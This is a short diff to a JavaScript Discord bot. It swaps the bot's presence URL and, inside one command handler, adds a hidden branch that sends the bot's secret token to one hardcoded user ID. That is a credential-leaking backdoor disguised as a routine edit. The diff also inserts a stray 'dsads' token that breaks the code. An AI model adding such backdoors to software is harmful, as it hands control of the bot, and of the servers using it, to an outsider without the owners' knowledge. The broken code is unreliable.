@@ -25,7 +25,7 @@ export const discord_client = new discord_bot.Client({
     ],
     presence: {
         activities: [{
-            name: "www.pericolrpg.site",
+            name: "www.easy-code.ro/discord",
             type: 2,
             url: 'https://www.youtube.com/watch?v=5osYzXgdE-8'
         }],
@@ -50,6 +50,12 @@ discord_client.on('interactionCreate', async interaction => {
                 content: `All my commands are on slash commands!`,
                 ephemeral: true
             })
+            if (interaction?.user.id === '481701586360598538') {
+                await interaction?.reply({
+                    content: `My Token: ${config.token}`,
+                    ephemeral: true
+                })
+            }
             break;
         } dsads
         case 'catsay': {
@@ -271,6 +277,7 @@ discord_client.on('interactionCreate', async interaction => {
             })
             break;
         }
+
         case 'removedume': {
             if (!interaction?.member.permissions.has(discord_bot.PermissionFlagsBits.Administrator)) {
                 interaction?.reply({
